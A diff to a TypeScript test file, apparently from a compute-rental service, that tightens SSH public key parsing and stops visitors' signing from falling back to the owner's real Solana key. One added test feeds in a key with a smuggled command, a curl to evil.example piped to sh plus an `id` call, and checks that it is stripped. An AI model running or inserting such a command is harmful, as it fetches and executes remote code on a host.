@@ -19,7 +19,10 @@ describe("parseRunInput", () => {
 
   it("takes the renter's own SSH public key, one line, and never anything else", () => {
     const ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0m0b1x0u2r3n4t5e6s7t8k9e0y1a2b3c4d5e6f7g8h9 me@laptop";
-    expect(parseRunInput({ ...good, sshPublicKey: `  ${ed}\n` })).toMatchObject({ ok: true, value: { sshPublicKey: ed } });
+    // only the type and the key go on to the seller: the comment, free text, is dropped
+    const bare = ed.split(" ").slice(0, 2).join(" ");
+    expect(parseRunInput({ ...good, sshPublicKey: `  ${ed}\n` })).toMatchObject({ ok: true, value: { sshPublicKey: bare } });
+    expect(sshPublicKeyOf(`${bare} $(curl evil.example|sh); \`id\``)).toBe(bare);
     expect(parseRunInput({ ...good })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
     expect(parseRunInput({ ...good, sshPublicKey: "" })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
     expect(sshPublicKeyOf(`ssh-rsa ${"A".repeat(372)}`)).not.toBeNull();
@@ -154,10 +157,12 @@ describe("which agent key signs", () => {
     expect(secretFor("real", env, "owner")).toBe("owner-real");
     expect(secretFor("real", env, "public")).toBe("public-real");
   });
-  it("without a key for visitors, they fall back to the owner's real key, then to the agent key", () => {
-    expect(secretFor("real", { ...env, PUBLIC_MAINNET_SOLANA_SECRET_KEY: "" }, "public")).toBe("owner-real");
-    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "agent" }, "public")).toBe("agent");
+  it("without a key for visitors there is no key for them on the real market: never the owner's", () => {
+    expect(secretFor("real", { ...env, PUBLIC_MAINNET_SOLANA_SECRET_KEY: "" }, "public")).toBeNull();
+    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "agent", MAINNET_SOLANA_SECRET_KEY: "owner-real" }, "public")).toBeNull();
     expect(secretFor("real", {}, "public")).toBeNull();
+    // the owner still falls back to the agent key when no separate real key is set
+    expect(secretFor("real", { AGENT_SOLANA_SECRET_KEY: "agent" }, "owner")).toBe("agent");
   });
   it("the test market has one agent key for everyone, and the public key is never used there", () => {
     expect(secretFor("test", env, "owner")).toBe("agent");
